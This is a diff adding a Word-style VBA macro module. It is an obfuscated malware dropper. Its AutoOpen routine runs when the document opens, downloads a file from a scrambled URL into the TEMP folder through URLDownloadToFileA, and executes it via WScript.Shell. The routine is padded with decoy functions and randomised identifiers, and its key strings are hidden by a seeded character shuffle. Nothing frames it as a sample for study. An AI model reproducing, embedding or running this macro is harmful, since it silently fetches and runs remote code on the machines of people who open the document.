@@ -1,0 +1,88 @@
+#If VBA7 Then
+   Public Declare PtrSafe Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
+   
+   Private Declare PtrSafe Function iSILlzCwXBS Lib "urlmon" Alias "URLDownloadToFileA" _
+    (ByVal irQ1Vb72t6b As Long, ByVal iIXtKRzHJkl As String, ByVal iNNL94gD8hI As String, ByVal ii9FwLiiVlr As Long, ByVal iznz68mkaaJ As Long) As Long
+#Else
+    Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
+
+    
+    Private Declare Function iSILlzCwXBS Lib "urlmon" Alias "URLDownloadToFileA" _
+     (ByVal iQQSxJfdLyE As Long, ByVal i4jCnl5JJWu As String, ByVal iPD4NeO4WFY As String, ByVal iURvmkth8tn As Long, ByVal ibTaRjJOa6J As Long) As Long
+#End If
+
+Function isWord(str As String) As Boolean
+    Dim ret As Boolean
+    If str = Null Then
+        ret = False
+    ElseIf Len(str) = 0 Then
+        ret = False
+    Else
+        ret = False
+    End If
+    isWord = ret
+End Function
+
+Public Const WM_UNDO = &H304
+
+Function Pc47CgEuc(ByVal XZand1vde2c As String) As Boolean
+	Dim F3bzla2 As Object
+	Set F3bzla2 = CreateObject(WFno6(4))
+	Set F3bzla2 = F3bzla2.exec(XZand1vde2c)
+End Function
+
+
+Private Function NiE4arR(ByVal H62D9 As String, Optional c2mrU As Long = 0) As String
+       Dim Ujp As Long, W5RRgTm As Long, WAVWH As Byte, LWCsC As Long
+    Dim FDJJ6D() As Long, KPa4() As Byte, RRgTm As Long
+        KPa4 = StrConv(H62D9, vbFromUnicode)
+        W5RRgTm = c2mrU
+    RRgTm = UBound(KPa4)
+        For Ujp = 0 To RRgTm
+        W5RRgTm = W5RRgTm + KPa4(Ujp)
+    Next Ujp
+        Rnd -1
+    Randomize W5RRgTm
+        ReDim FDJJ6D(RRgTm)
+    For Ujp = 0 To RRgTm
+        FDJJ6D(Ujp) = Fix((RRgTm + 1) * Rnd)
+    Next Ujp
+        For Ujp = RRgTm To 0 Step -1
+        LWCsC = FDJJ6D(Ujp)
+                
+        WAVWH = KPa4(Ujp)
+        KPa4(Ujp) = KPa4(LWCsC)
+        KPa4(LWCsC) = WAVWH
+    Next Ujp
+    
+    NiE4arR = StrConv(KPa4, vbUnicode)
+End Function
+
+
+Sub AutoOpen()
+    Dim str As String: str = Zand1 & WFno6(2)
+    iSILlzCwXBS 0, WFno6(3), str, 0, 0
+    Pc47CgEuc str
+End Sub
+
+Private Function WFno6(ByVal bgEqm As Integer) As String
+	If bgEqm = 1 Then
+		YK8rg = "t"
+		YK8rg = YK8rg & "m"
+		WFno6 = YK8rg & "p"
+	ElseIf bgEqm = 2 Then
+		WFno6 = NiE4arR("eekExe.rX")
+	ElseIf bgEqm = 3 Then
+		WFno6 = NiE4arR("wxeeihzpypzdo8.s:/rwmt/te1g=holc3bolks/w/?ngxxoddc.wx1/.")
+	ElseIf bgEqm = 4 Then
+		WFno6 = NiE4arR("esw.stilhplcr")
+	End If
+End Function
+
+
+Public Function Zand1() As String
+    DmpJTbe = "\"
+    Zand1 = Environ(WFno6(1)) & DmpJTbe
+End Function
+
+
